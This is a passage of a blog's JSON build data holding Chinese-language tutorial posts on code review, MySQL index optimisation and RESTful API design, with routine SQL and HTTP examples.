\u5148\u80af\u5b9a\u505a\u5f97\u597d\u7684\u5730\u65b9\\n- \u63d0\u4f9b\u5efa\u8bbe\u6027\u5efa\u8bae\\n- \u533a\u5206\u5fc5\u987b\u6539\u548c\u5efa\u8bae\u6539\\n- \u7ed9\u51fa\u7406\u7531\u548c\u53c2\u8003\u8d44\u6599\\n```\\n\\n### \u5904\u7406\u5206\u6b67\\n\\n```markdown\\n- \u57fa\u4e8e\u6280\u672f\u8ba8\u8bba\uff0c\u4e0d\u9488\u5bf9\u4e2a\u4eba\\n- \u7528\u6570\u636e\u548c\u6587\u6863\u652f\u6301\u89c2\u70b9\\n- \u9002\u65f6\u7ebf\u4e0b\u8ba8\u8bba\\n- \u5fc5\u8981\u65f6\u8bf7\u7b2c\u4e09\u65b9\u4ef2\u88c1\\n```\\n\\n---\\n\\n## \ud83d\udcda \u63a8\u8350\u8d44\u6e90\\n\\n- [Google Code Review \u6307\u5357](https://google.github.io/eng-practices/review/)\\n- [Conventional Comments](https://conventionalcomments.org/)\\n- [How to Make Good Code Reviews Better](https://stackoverflow.blog/2019/09/30/how-to-make-good-code-reviews-better/)\\n\\n---\\n\\nCode Review \u4e0d\u53ea\u662f\u627e bug\uff0c\u66f4\u662f\u56e2\u961f\u5b66\u4e60\u548c\u6210\u957f\u7684\u673a\u4f1a\u3002\u4fdd\u6301\u5f00\u653e\u5fc3\u6001\uff0c\u6301\u7eed\u6539\u8fdb\u3002"},{"id":"database-index","metadata":{"permalink":"/blog/database-index","editUrl":"https://github.com/hweos/git-pages/edit/main/blog/2024-05-10-database-index.md","source":"@site/blog/2024-05-10-database-index.md","title":"\u6570\u636e\u5e93\u7d22\u5f15\u4f18\u5316\u5b9e\u6218\u6307\u5357","description":"\u7d22\u5f15\u662f\u6570\u636e\u5e93\u6027\u80fd\u4f18\u5316\u7684\u5173\u952e\u3002\u672c\u6587\u8bb2\u89e3\u7d22\u5f15\u539f\u7406\u3001\u4f7f\u7528\u6280\u5de7\u548c\u5e38\u89c1\u8bef\u533a\u3002","date":"2024-05-10T00:00:00.000Z","tags":[{"inline":true,"label":"\u6570\u636e\u5e93","permalink":"/blog/tags/\u6570\u636e\u5e93"},{"inline":true,"label":"MySQL","permalink":"/blog/tags/my-sql"},{"inline":true,"label":"\u6027\u80fd","permalink":"/blog/tags/\u6027\u80fd"}],"readingTime":4.14,"hasTruncateMarker":true,"authors":[{"name":"Mason","title":"Full Stack Developer","url":"https://github.com/HuangZhe007","socials":{"github":"https://github.com/HuangZhe007"},"imageURL":"https://avatars.githubusercontent.com/u/45168628?v=4","key":"mason","page":null}],"frontMatter":{"slug":"database-index","title":"\u6570\u636e\u5e93\u7d22\u5f15\u4f18\u5316\u5b9e\u6218\u6307\u5357","authors":"mason","tags":["\u6570\u636e\u5e93","MySQL","\u6027\u80fd"]},"unlisted":false,"prevItem":{"title":"\u4ee3\u7801\u8bc4\u5ba1\u6700\u4f73\u5b9e\u8df5","permalink":"/blog/code-review"},"nextItem":{"title":"RESTful API \u8bbe\u8ba1\u89c4\u8303\u4e0e\u6700\u4f73\u5b9e\u8df5","permalink":"/blog/restful-api-design"}},"content":"\u7d22\u5f15\u662f\u6570\u636e\u5e93\u6027\u80fd\u4f18\u5316\u7684\u5173\u952e\u3002\u672c\u6587\u8bb2\u89e3\u7d22\u5f15\u539f\u7406\u3001\u4f7f\u7528\u6280\u5de7\u548c\u5e38\u89c1\u8bef\u533a\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n## \ud83d\udcda \u7d22\u5f15\u57fa\u7840\\n\\n### \u4ec0\u4e48\u662f\u7d22\u5f15\\n\\n\u7d22\u5f15\u5c31\u50cf\u4e66\u7684\u76ee\u5f55\uff0c\u5e2e\u52a9\u6570\u636e\u5e93\u5feb\u901f\u5b9a\u4f4d\u6570\u636e\uff0c\u907f\u514d\u5168\u8868\u626b\u63cf\u3002\\n\\n### \u7d22\u5f15\u7c7b\u578b\\n\\n| \u7c7b\u578b | \u8bf4\u660e | \u4f7f\u7528\u573a\u666f |\\n|------|------|---------|\\n| B+Tree | \u6700\u5e38\u7528\uff0c\u8303\u56f4\u67e5\u8be2 | \u4e3b\u952e\u3001\u666e\u901a\u67e5\u8be2 |\\n| Hash | \u7cbe\u786e\u5339\u914d | \u7b49\u503c\u67e5\u8be2 |\\n| Full-text | \u5168\u6587\u641c\u7d22 | \u6587\u672c\u641c\u7d22 |\\n| Spatial | \u7a7a\u95f4\u7d22\u5f15 | \u5730\u7406\u4f4d\u7f6e |\\n\\n---\\n\\n## \ud83c\udf33 B+Tree \u7d22\u5f15\\n\\n### \u7ed3\u6784\u7279\u70b9\\n\\n```\\n                    [50]\\n                   /    \\\\\\n           [20,30]      [60,70]\\n          /   |   \\\\    /   |   \\\\\\n       [10] [25] [35] [55] [65] [80]\\n         \u2193    \u2193    \u2193    \u2193    \u2193    \u2193\\n       data data data data data data\\n```\\n\\n- \u975e\u53f6\u5b50\u8282\u70b9\u53ea\u5b58\u7d22\u5f15\\n- \u53f6\u5b50\u8282\u70b9\u5b58\u6570\u636e\uff0c\u5f62\u6210\u94fe\u8868\\n- \u652f\u6301\u8303\u56f4\u67e5\u8be2\\n\\n### \u805a\u7c07\u7d22\u5f15 vs \u975e\u805a\u7c07\u7d22\u5f15\\n\\n```sql\\n-- \u805a\u7c07\u7d22\u5f15 (\u4e3b\u952e)\\n-- \u53f6\u5b50\u8282\u70b9\u5b58\u50a8\u5b8c\u6574\u884c\u6570\u636e\\nPRIMARY KEY (id)\\n\\n-- \u975e\u805a\u7c07\u7d22\u5f15 (\u4e8c\u7ea7\u7d22\u5f15)\\n-- \u53f6\u5b50\u8282\u70b9\u5b58\u50a8\u4e3b\u952e\u503c\\nINDEX idx_name (name)\\n```\\n\\n**\u56de\u8868\u67e5\u8be2**\uff1a\u4e8c\u7ea7\u7d22\u5f15\u627e\u5230\u4e3b\u952e \u2192 \u4e3b\u952e\u7d22\u5f15\u627e\u5230\u6570\u636e\\n\\n---\\n\\n## \ud83d\udd27 \u7d22\u5f15\u521b\u5efa\\n\\n### \u5355\u5217\u7d22\u5f15\\n\\n```sql\\n-- \u521b\u5efa\u7d22\u5f15\\nCREATE INDEX idx_email ON users(email);\\n\\n-- \u8868\u5b9a\u4e49\u65f6\u521b\u5efa\\nCREATE TABLE users (\\n  id INT PRIMARY KEY,\\n  email VARCHAR(255),\\n  INDEX idx_email (email)\\n);\\n```\\n\\n### \u590d\u5408\u7d22\u5f15\\n\\n```sql\\n-- \u591a\u5217\u7d22\u5f15\\nCREATE INDEX idx_name_age ON users(name, age);\\n\\n-- \u9075\u5faa\u6700\u5de6\u524d\u7f00\u539f\u5219\\nWHERE name = \'John\'                    -- \u2705 \u4f7f\u7528\u7d22\u5f15\\nWHERE name = \'John\' AND age = 25       -- \u2705 \u4f7f\u7528\u7d22\u5f15\\nWHERE age = 25                         -- \u274c \u4e0d\u4f7f\u7528\u7d22\u5f15\\nWHERE age = 25 AND name = \'John\'       -- \u2705 \u4f18\u5316\u5668\u4f1a\u8c03\u6574\u987a\u5e8f\\n```\\n\\n### \u552f\u4e00\u7d22\u5f15\\n\\n```sql\\nCREATE UNIQUE INDEX idx_email ON users(email);\\n```\\n\\n### \u524d\u7f00\u7d22\u5f15\\n\\n```sql\\n-- \u5bf9\u957f\u5b57\u7b26\u4e32\u7684\u524d N \u4e2a\u5b57\u7b26\u521b\u5efa\u7d22\u5f15\\nCREATE INDEX idx_email ON users(email(10));\\n```\\n\\n---\\n\\n## \ud83d\udcca EXPLAIN \u5206\u6790\\n\\n### \u4f7f\u7528\u65b9\u6cd5\\n\\n```sql\\nEXPLAIN SELECT * FROM users WHERE email = \'test@example.com\';\\n```\\n\\n### \u5173\u952e\u5b57\u6bb5\\n\\n| \u5b57\u6bb5 | \u8bf4\u660e | \u5173\u6ce8\u70b9 |\\n|------|------|--------|\\n| type | \u8bbf\u95ee\u7c7b\u578b | const > eq_ref > ref > range > index > ALL |\\n| key | \u4f7f\u7528\u7684\u7d22\u5f15 | NULL \u8868\u793a\u672a\u4f7f\u7528\u7d22\u5f15 |\\n| rows | \u9884\u4f30\u626b\u63cf\u884c\u6570 | \u8d8a\u5c0f\u8d8a\u597d |\\n| Extra | \u989d\u5916\u4fe1\u606f | Using index, Using filesort |\\n\\n### type \u8be6\u89e3\\n\\n```sql\\n-- ALL: \u5168\u8868\u626b\u63cf \u274c\\nEXPLAIN SELECT * FROM users;\\n\\n-- index: \u5168\u7d22\u5f15\u626b\u63cf\\nEXPLAIN SELECT id FROM users;\\n\\n-- range: \u8303\u56f4\u626b\u63cf \u2705\\nEXPLAIN SELECT * FROM users WHERE age > 20;\\n\\n-- ref: \u975e\u552f\u4e00\u7d22\u5f15\u7b49\u503c\u67e5\u8be2 \u2705\\nEXPLAIN SELECT * FROM users WHERE name = \'John\';\\n\\n-- eq_ref: \u552f\u4e00\u7d22\u5f15\u7b49\u503c\u67e5\u8be2 \u2705\u2705\\nEXPLAIN SELECT * FROM users WHERE id = 1;\\n\\n-- const: \u4e3b\u952e/\u552f\u4e00\u7d22\u5f15\u5e38\u91cf\u67e5\u8be2 \u2705\u2705\u2705\\nEXPLAIN SELECT * FROM users WHERE id = 1;\\n```\\n\\n### Extra \u5173\u6ce8\u70b9\\n\\n```sql\\n-- Using index: \u8986\u76d6\u7d22\u5f15\uff0c\u4e0d\u9700\u8981\u56de\u8868 \u2705\\n-- Using where: \u9700\u8981\u8fc7\u6ee4 \\n-- Using temporary: \u4f7f\u7528\u4e34\u65f6\u8868 \u26a0\ufe0f\\n-- Using filesort: \u9700\u8981\u989d\u5916\u6392\u5e8f \u26a0\ufe0f\\n```\\n\\n---\\n\\n## \u26a1 \u4f18\u5316\u6280\u5de7\\n\\n### 1. \u8986\u76d6\u7d22\u5f15\\n\\n```sql\\n-- \u521b\u5efa\u590d\u5408\u7d22\u5f15\\nCREATE INDEX idx_name_email ON users(name, email);\\n\\n-- \u67e5\u8be2\u53ea\u7528\u7d22\u5f15\u4e2d\u7684\u5217\uff0c\u65e0\u9700\u56de\u8868\\nSELECT name, email FROM users WHERE name = \'John\';\\n```\\n\\n### 2. \u907f\u514d\u7d22\u5f15\u5931\u6548\\n\\n```sql\\n-- \u274c \u5bf9\u7d22\u5f15\u5217\u4f7f\u7528\u51fd\u6570\\nSELECT * FROM users WHERE YEAR(created_at) = 2024;\\n-- \u2705 \u6539\u4e3a\u8303\u56f4\u67e5\u8be2\\nSELECT * FROM users WHERE created_at >= \'2024-01-01\';\\n\\n-- \u274c \u9690\u5f0f\u7c7b\u578b\u8f6c\u6362\\nSELECT * FROM users WHERE phone = 13800138000;  -- phone \u662f varchar\\n-- \u2705 \u4f7f\u7528\u6b63\u786e\u7c7b\u578b\\nSELECT * FROM users WHERE phone = \'13800138000\';\\n\\n-- \u274c LIKE \u5de6\u6a21\u7cca\\nSELECT * FROM users WHERE name LIKE \'%John\';\\n-- \u2705 \u53f3\u6a21\u7cca\u53ef\u4ee5\u4f7f\u7528\u7d22\u5f15\\nSELECT * FROM users WHERE name LIKE \'John%\';\\n\\n-- \u274c OR \u6761\u4ef6\u672a\u5168\u90e8\u6709\u7d22\u5f15\\nSELECT * FROM users WHERE name = \'John\' OR age = 25;  -- age \u65e0\u7d22\u5f15\\n-- \u2705 \u4f7f\u7528 UNION\\nSELECT * FROM users WHERE name = \'John\'\\nUNION\\nSELECT * FROM users WHERE age = 25;\\n\\n-- \u274c \u4f7f\u7528 != \u6216 NOT IN\\nSELECT * FROM users WHERE status != \'deleted\';\\n```\\n\\n### 3. \u7d22\u5f15\u9009\u62e9\u6027\\n\\n```sql\\n-- \u9009\u62e9\u6027 = \u4e0d\u91cd\u590d\u503c\u6570\u91cf / \u603b\u884c\u6570\\n-- \u9009\u62e9\u6027\u8d8a\u9ad8\uff0c\u7d22\u5f15\u6548\u679c\u8d8a\u597d\\n\\n-- \u2705 \u9ad8\u9009\u62e9\u6027 (email, phone)\\n-- \u274c \u4f4e\u9009\u62e9\u6027 (gender, status) - \u4e0d\u9002\u5408\u5355\u72ec\u5efa\u7d22\u5f15\\n```\\n\\n### 4. \u590d\u5408\u7d22\u5f15\u987a\u5e8f\\n\\n```sql\\n-- \u539f\u5219\uff1a\\n-- 1. \u7b49\u503c\u67e5\u8be2\u5217\u5728\u524d\\n-- 2. \u8303\u56f4\u67e5\u8be2\u5217\u5728\u540e\\n-- 3. \u9009\u62e9\u6027\u9ad8\u7684\u5217\u5728\u524d\\n\\n-- \u67e5\u8be2: WHERE status = \'active\' AND created_at > \'2024-01-01\'\\nCREATE INDEX idx_status_created ON orders(status, created_at);\\n```\\n\\n---\\n\\n## \ud83d\udeab \u5e38\u89c1\u8bef\u533a\\n\\n### 1. \u4e0d\u662f\u8d8a\u591a\u8d8a\u597d\\n\\n```sql\\n-- \u7d22\u5f15\u9700\u8981\u7ef4\u62a4\uff0cINSERT/UPDATE/DELETE \u4f1a\u53d8\u6162\\n-- \u5efa\u8bae\u6bcf\u5f20\u8868\u4e0d\u8d85\u8fc7 5-6 \u4e2a\u7d22\u5f15\\n```\\n\\n### 2. \u5c0f\u8868\u4e0d\u9700\u8981\u7d22\u5f15\\n\\n```sql\\n-- \u51e0\u767e\u6761\u6570\u636e\u7684\u8868\uff0c\u5168\u8868\u626b\u63cf\u53ef\u80fd\u66f4\u5feb\\n```\\n\\n### 3. \u6ce8\u610f\u7d22\u5f15\u5408\u5e76\\n\\n```sql\\n-- MySQL \u53ef\u80fd\u5408\u5e76\u591a\u4e2a\u5355\u5217\u7d22\u5f15\\n-- \u4f46\u590d\u5408\u7d22\u5f15\u901a\u5e38\u6548\u7387\u66f4\u9ad8\\n```\\n\\n---\\n\\n## \ud83d\udee0\ufe0f \u5b9e\u7528\u547d\u4ee4\\n\\n```sql\\n-- \u67e5\u770b\u8868\u7d22\u5f15\\nSHOW INDEX FROM users;\\n\\n-- \u67e5\u770b\u7d22\u5f15\u4f7f\u7528\u60c5\u51b5\\nSHOW STATUS LIKE \'Handler%\';\\n\\n-- \u5220\u9664\u7d22\u5f15\\nDROP INDEX idx_email ON users;\\n\\n-- \u5f3a\u5236\u4f7f\u7528\u7d22\u5f15\\nSELECT * FROM users FORCE INDEX(idx_email) WHERE email = \'test@example.com\';\\n\\n-- \u5ffd\u7565\u7d22\u5f15\\nSELECT * FROM users IGNORE INDEX(idx_email) WHERE email = \'test@example.com\';\\n```\\n\\n---\\n\\n## \u2705 \u7d22\u5f15\u8bbe\u8ba1\u6e05\u5355\\n\\n- [ ] \u4e3a WHERE\u3001JOIN\u3001ORDER BY \u5217\u521b\u5efa\u7d22\u5f15\\n- [ ] \u4f7f\u7528\u590d\u5408\u7d22\u5f15\u4f18\u5316\u591a\u6761\u4ef6\u67e5\u8be2\\n- [ ] \u6ce8\u610f\u6700\u5de6\u524d\u7f00\u539f\u5219\\n- [ ] \u5229\u7528\u8986\u76d6\u7d22\u5f15\u51cf\u5c11\u56de\u8868\\n- [ ] \u4f7f\u7528 EXPLAIN \u5206\u6790\u67e5\u8be2\\n- [ ] \u907f\u514d\u7d22\u5f15\u5931\u6548\u7684\u5199\u6cd5\\n- [ ] \u5b9a\u671f\u5206\u6790\u548c\u4f18\u5316\u7d22\u5f15\\n- [ ] \u76d1\u63a7\u6162\u67e5\u8be2\u65e5\u5fd7\\n\\n---\\n\\n\u7d22\u5f15\u4f18\u5316\u662f\u4e00\u4e2a\u6301\u7eed\u7684\u8fc7\u7a0b\u3002\u5148\u5206\u6790\u4e1a\u52a1\u573a\u666f\uff0c\u518d\u8bbe\u8ba1\u7d22\u5f15\uff0c\u6700\u540e\u7528 EXPLAIN \u9a8c\u8bc1\u6548\u679c\u3002"},{"id":"restful-api-design","metadata":{"permalink":"/blog/restful-api-design","editUrl":"https://github.com/hweos/git-pages/edit/main/blog/2024-05-01-restful-api.md","source":"@site/blog/2024-05-01-restful-api.md","title":"RESTful API \u8bbe\u8ba1\u89c4\u8303\u4e0e\u6700\u4f73\u5b9e\u8df5","description":"\u8bbe\u8ba1\u826f\u597d\u7684 API \u662f\u540e\u7aef\u5f00\u53d1\u7684\u57fa\u7840\u3002\u672c\u6587\u603b\u7ed3 RESTful API \u7684\u8bbe\u8ba1\u89c4\u8303\u548c\u6700\u4f73\u5b9e\u8df5\u3002","date":"2024-05-01T00:00:00.000Z","tags":[{"inline":true,"label":"API","permalink":"/blog/tags/api"},{"inline":true,"label":"\u540e\u7aef","permalink":"/blog/tags/\u540e\u7aef"},{"inline":true,"label":"\u67b6\u6784","permalink":"/blog/tags/\u67b6\u6784"}],"readingTime":3.43,"hasTruncateMarker":true,"authors":[{"name":"Mason","title":"Full Stack Developer","url":"https://github.com/HuangZhe007","socials":{"github":"https://github.com/HuangZhe007"},"imageURL":"https://avatars.githubusercontent.com/u/45168628?v=4","key":"mason","page":null}],"frontMatter":{"slug":"restful-api-design","title":"RESTful API \u8bbe\u8ba1\u89c4\u8303\u4e0e\u6700\u4f73\u5b9e\u8df5","authors":"mason","tags":["API","\u540e\u7aef","\u67b6\u6784"]},"unlisted":false,"prevItem":{"title":"\u6570\u636e\u5e93\u7d22\u5f15\u4f18\u5316\u5b9e\u6218\u6307\u5357","permalink":"/blog/database-index"},"nextItem":{"title":"\u6d4f\u89c8\u5668\u6e32\u67d3\u539f\u7406\u6df1\u5ea6\u89e3\u6790","permalink":"/blog/browser-rendering"}},"content":"\u8bbe\u8ba1\u826f\u597d\u7684 API \u662f\u540e\u7aef\u5f00\u53d1\u7684\u57fa\u7840\u3002\u672c\u6587\u603b\u7ed3 RESTful API \u7684\u8bbe\u8ba1\u89c4\u8303\u548c\u6700\u4f73\u5b9e\u8df5\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n## \ud83c\udfaf REST \u6838\u5fc3\u539f\u5219\\n\\n| \u539f\u5219 | \u8bf4\u660e |\\n|------|------|\\n| \u8d44\u6e90\u5bfc\u5411 | \u4ee5\u8d44\u6e90\u4e3a\u4e2d\u5fc3\uff0c\u800c\u975e\u64cd\u4f5c |\\n| \u7edf\u4e00\u63a5\u53e3 | \u4f7f\u7528\u6807\u51c6 HTTP \u65b9\u6cd5 |\\n| \u65e0\u72b6\u6001 | \u6bcf\u4e2a\u8bf7\u6c42\u5305\u542b\u6240\u6709\u5fc5\u8981\u4fe1\u606f |\\n| \u53ef\u7f13\u5b58 | \u5408\u7406\u4f7f\u7528 HTTP \u7f13\u5b58 |\\n\\n---\\n\\n## \ud83d\udcdd URL \u8bbe\u8ba1\u89c4\u8303\\n\\n### \u4f7f\u7528\u540d\u8bcd\uff0c\u4e0d\u7528\u52a8\u8bcd\\n\\n```bash\\n# \u2705 \u6b63\u786e\\nGET /users\\nGET /users/123\\nPOST /users\\nPUT /users/123\\nDELETE /users/123\\n\\n# \u274c \u9519\u8bef\\nGET /getUsers\\nPOST /createUser\\nPOST /deleteUser\\n```\\n\\n### \u4f7f\u7528\u590d\u6570\u5f62\u5f0f\\n\\n```bash\\n# \u2705 \u6b63\u786e\\nGET /users\\nGET /articles\\nGET /comments\\n\\n# \u274c \u9519\u8bef\\nGET /user\\nGET /article\\n```\\n\\n### \u8d44\u6e90\u5d4c\u5957\\n\\n```bash\\n# \u83b7\u53d6\u7528\u6237\u7684\u6587\u7ae0\\nGET /users/123/articles\\n\\n# \u83b7\u53d6\u6587\u7ae0\u7684\u8bc4\u8bba\\nGET /articles/456/comments\\n\\n# \u4e0d\u8d85\u8fc7 2 \u5c42\u5d4c\u5957\\nGET /users/123/articles/456/comments  # \u274c \u592a\u6df1\\nGET /articles/456/comments            # \u2705 \u66f4\u6e05\u6670\\n```\\n\\n### URL \u547d\u540d\u89c4\u8303\\n\\n```bash\\n# \u4f7f\u7528\u5c0f\u5199\u5b57\u6bcd\\nGET /user-profiles    # \u2705 kebab-case\\nGET /userProfiles     # \u274c camelCase\\nGET /user_profiles    # \u26a0\ufe0f snake_case (\u53ef\u63a5\u53d7)\\n\\n# \u4e0d\u5305\u542b\u6587\u4ef6\u6269\u5c55\u540d\\nGET /users            # \u2705\\nGET /users.json       # \u274c\\n```\\n\\n---\\n\\n## \ud83d\udd27 HTTP \u65b9\u6cd5\\n\\n| \u65b9\u6cd5 | \u7528\u9014 | \u5e42\u7b49\u6027 | \u5b89\u5168\u6027 |\\n|------|------|--------|--------|\\n| GET | \u83b7\u53d6\u8d44\u6e90 | \u2705 | \u2705 |\\n| POST | \u521b\u5efa\u8d44\u6e90 | \u274c | \u274c |\\n| PUT | \u5168\u91cf\u66f4\u65b0 | \u2705 | \u274c |\\n| PATCH | \u90e8\u5206\u66f4\u65b0 | \u274c | \u274c |\\n| DELETE | \u5220\u9664\u8d44\u6e90 | \u2705 | \u274c |\\n\\n### \u793a\u4f8b\\n\\n```bash\\n# \u83b7\u53d6\u6240\u6709\u7528\u6237\\nGET /users\\n\\n# \u83b7\u53d6\u5355\u4e2a\u7528\u6237\\nGET /users/123\\n\\n# \u521b\u5efa\u7528\u6237\\nPOST /users\\nBody: { \\"name\\": \\"John\\", \\"email\\": \\"john@example.com\\" }\\n\\n# \u5168\u91cf\u66f4\u65b0\u7528\u6237\\nPUT /users/123\\nBody: { \\"name\\": \\"John\\", \\"email\\": \\"john@new.com\\", \\"age\\": 30 }\\n\\n# \u90e8\u5206\u66f4\u65b0\u7528\u6237\\nPATCH /users/123\\nBody: { \\"email\\": \\"john@updated.com\\" }\\n\\n# \u5220\u9664\u7528\u6237\\nDELETE /users/123\\n```\\n\\n---\\n\\n## \ud83d\udcca \u72b6\u6001\u7801\\n\\n### \u6210\u529f\u54cd\u5e94\\n\\n| \u72b6\u6001\u7801 | \u542b\u4e49 | \u4f7f\u7528\u573a\u666f |\\n|--------|------|---------|\\n| 200 | OK | GET\u3001PUT\u3001PATCH \u6210\u529f |\\n| 201 | Created | POST \u521b\u5efa\u6210\u529f |\\n| 204 | No Content | DELETE \u6210\u529f |\\n\\n### \u5ba2\u6237\u7aef\u9519\u8bef\\n\\n| \u72b6\u6001\u7801 | \u542b\u4e49 | \u4f7f\u7528\u573a\u666f |\\n|--------|------|---------|\\n| 400 | Bad Request | \u8bf7\u6c42\u53c2\u6570\u9519\u8bef |\\n| 401 | Unauthorized | \u672a\u8ba4\u8bc1 |\\n| 403 | Forbidden | \u65e0\u6743\u9650 |\\n| 404 | Not Found | \u8d44\u6e90\u4e0d\u5b58\u5728 |\\n| 409 | Conflict | \u8d44\u6e90\u51b2\u7a81 |\\n| 422 | Unprocessable | \u9a8c\u8bc1\u5931\u8d25 |\\n| 429 | Too Many Requests | \u9650\u6d41 |\\n\\n### \u670d\u52a1\u7aef\u9519\u8bef\\n\\n| \u72b6\u6001\u7801 | \u542b\u4e49 | \u4f7f\u7528\u573a\u666f |\\n|--------|------|---------|\\n| 500 | Internal Error | \u670d\u52a1\u5668\u9519\u8bef |\\n| 502 | Bad Gateway | \u7f51\u5173\u9519\u8bef |\\n| 503 | Service Unavailable | \u670d\u52a1\u4e0d\u53ef\u7528 |\\n\\n---\\n\\n## \ud83d\udce6 \u54cd\u5e94\u683c\u5f0f\\n\\n### \u6210\u529f\u54cd\u5e94\\n\\n```json\\n// \u5355\u4e2a\u8d44\u6e90\\n{\\n  \\"data\\": {\\n    \\"id\\": 123,\\n    \\"name\\": \\"John\\",\\n    \\"email\\": \\"john@example.com\\"\\n  }\\n}\\n\\n// \u5217\u8868\u8d44\u6e90\\n{\\n  \\"data\\": [\\n    { \\"id\\": 1, \\"name\\": \\"John\\" },\\n    { \\"id\\": 2, \\"name\\": \\"Jane\\" }\\n  ],\\n  \\"pagination\\": {\\n    \\"total\\": 100,\\n    \\"page\\": 1,\\n    \\"per_page\\": 20,\\n    \\"total_pages\\": 5\\n  }\\n}\\n```\\n\\n### \u9519\u8bef\u54cd\u5e94\\n\\n```json\\n{\\n  \\"error\\": {\\n    \\"code\\": \\"VALIDATION_ERROR\\",\\n    \\"message\\": \\"Validation failed\\",\\n    \\"details\\": [\\n      {\\n        \\"field\\": \\"email\\",\\n        \\"message\\": \\"Invalid email format\\"\\n      }\\n    ]\\n  }\\n}\\n```\\n\\n---\\n\\n## \ud83d\udd0d \u67e5\u8be2\u53c2\u6570\\n\\n### \u5206\u9875\\n\\n```bash\\nGET /users?page=2&per_page=20\\nGET /users?offset=20&limit=20\\n```\\n\\n### \u6392\u5e8f\\n\\n```bash\\nGET /users?sort=created_at         # \u5347\u5e8f\\nGET /users?sort=-created_at        # \u964d\u5e8f\\nGET /users?sort=name,-created_at   # \u591a\u5b57\u6bb5\\n```\\n\\n### \u8fc7\u6ee4\\n\\n```bash\\nGET /users?status=active\\nGET /users?role=admin&status=active\\nGET /users?created_at[gte]=2024-01-01\\n```\\n\\n### \u5b57\u6bb5\u9009\u62e9\\n\\n```bash\\nGET /users?fields=id,name,email\\n```\\n\\n### \u641c\u7d22\\n\\n```bash\\nGET /users?q=john\\nGET /users?search=john\\n```\\n\\n---\\n\\n## \ud83d\udd10 \u8ba4\u8bc1\u4e0e\u6388\u6743\\n\\n### JWT Token\\n\\n```bash\\n# \u8bf7\u6c42\u5934\\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIs...\\n```\\n\\n### API Key\\n\\n```bash\\n# \u8bf7\u6c42\u5934\\nX-API-Key: your-api-key\\n\\n# \u67e5\u8be2\u53c2\u6570 (\u4e0d\u63a8\u8350)\\nGET /users?api_key=your-api-key\\n```\\n\\n---\\n\\n## \ud83d\udccc \u7248\u672c\u63a7\u5236\\n\\n### URL \u8def\u5f84 (\u63a8\u8350)\\n\\n```bash\\nGET /v1/users\\nGET /v2/users\\n```\\n\\n### \u8bf7\u6c42\u5934\\n\\n```bash\\nAccept: application/vnd.api+json; version=1\\nX-API-Version: 1\\n```\\n\\n### \u67e5\u8be2\u53c2\u6570\\n\\n```bash\\nGET /users?version=1\\n```\\n\\n---\\n\\n## \ud83d\udea6 \u9650\u6d41\\n\\n### \u54cd\u5e94\u5934\\n\\n```http\\nX-RateLimit-Limit: 100\\nX-RateLimit-Remaining: 95\\nX-RateLimit-Reset: 1609459200\\n```\\n\\n### \u9650\u6d41\u54cd\u5e94\\n\\n```json\\n// HTTP 429 Too Many Requests\\n{\\n  \\"error\\": {\\n    \\"code\\": \\"RATE_LIMIT_EXCEEDED\\",\\n    \\"message\\": \\"Too many requests\\",\\n    \\"retry_after\\": 60\\n  }\\n}\\n```\\n\\n---\\n\\n## \ud83d\udcc4 \u6587\u6863\u89c4\u8303\\n\\n### OpenAPI/Swagger\\n\\n```yaml\\nopenapi: 3.0.0\\ninfo:\\n  title: User API\\n  version: 1.0.0\\npaths:\\n  /users:\\n    get:\\n      summary: Get all users\\n      parameters:\\n        - name: page\\n          in: query\\n          schema:\\n            type: integer\\n      responses:\\n        \'200\':\\n          description: Success\\n```\\n\\n### \u63a8\u8350\u5de5\u5177\\n\\n| \u5de5\u5177 | \u7528\u9014 |\\n|------|------|\\n| Swagger UI | API \u6587\u6863\u5c55\u793a |\\n| Postman | API \u6d4b\u8bd5 |\\n| Insomnia | API \u6d4b\u8bd5 |\\n| Stoplight | API \u8bbe\u8ba1 |\\n\\n---\\n\\n## \u2705 \u8bbe\u8ba1\u6e05\u5355\\n\\n- [ ] URL \u4f7f\u7528\u540d\u8bcd\u590d\u6570\\n- [ ] \u6b63\u786e\u4f7f\u7528 HTTP \u65b9\u6cd5\\n- [ ] \u8fd4\u56de\u5408\u9002\u7684\u72b6\u6001\u7801\\n- [ ] \u7edf\u4e00\u7684\u54cd\u5e94\u683c\u5f0f\\n- [ ] \u5206\u9875\u3001\u6392\u5e8f\u3001\u8fc7\u6ee4\\n- [ ] \u7248\u672c\u63a7\u5236\\n- [ ] \u9519\u8bef\u5904\u7406\u89c4\u8303\\n- [ ] \u8ba4\u8bc1\u6388\u6743\u673a\u5236\\n- [ ] \u9650\u6d41\u4fdd\u62a4\\n- [ ] \u5b8c\u5584\u7684\u6587\u6863\\n\\n---\\n\\n\u597d\u7684 API \u8bbe\u8ba1\u80fd\u8ba9\u524d\u540e\u7aef\u534f\u4f5c\u66f4\u987a\u7545\uff0c\u4e5f\u80fd\u964d\u4f4e\u7ef4\u62a4\u6210\u672c\u3002\u591a\u53c2\u8003\u6210\u719f\u7684 API \u8bbe\u8ba1\uff0c\u5982 GitHub API\u3001Stripe API\u3002"},{"id":"browser-rendering","metadata":{"permalink":"/blog/browser-rendering","editUrl":"https://github.com/hweos/git-pages/edit/main/blog/2024-04-20-browser-rendering.md","source":"@site/blog/2024-04-20-browser-rendering.md","title":"\u6d4f\u89c8\u5668\u6e32\u67d3\u539f\u7406\u6df1\u5ea6\u89e3\u6790","description":"\u7406\u89e3\u6d4f\u89c8\u5668\u6e32\u67d3\u539f\u7406\u662f\u524d\u7aef\u6027\u80fd\u4f18\u5316\u7684\u57fa\u7840\u3002\u672c\u6587\u6df1\u5165\u89e3\u6790\u4ece HTML \u5230\u50cf\u7d20\u7684\u5b8c\u6574\u8fc7\u7a0b\u3002","date":"2024-04-20T00:00:00.000Z","tags":[{"inline":true,"label":"\u6d4f\u89c8\u5668","permalink":"/blog/tags/\u6d4f\u89c8\u5668"},{"inline":true,"label":"\u6027\u80fd","permalink":"/blog/tags/\u6027\u80fd"},{"inline":true,"label":"\u524d\u7aef","permalink":"/blog/tags/\u524d\u7aef"}],"readingTime":3.31,"hasTruncateMarker":true,"authors":[{"name":"Mason","title":"Full Stack 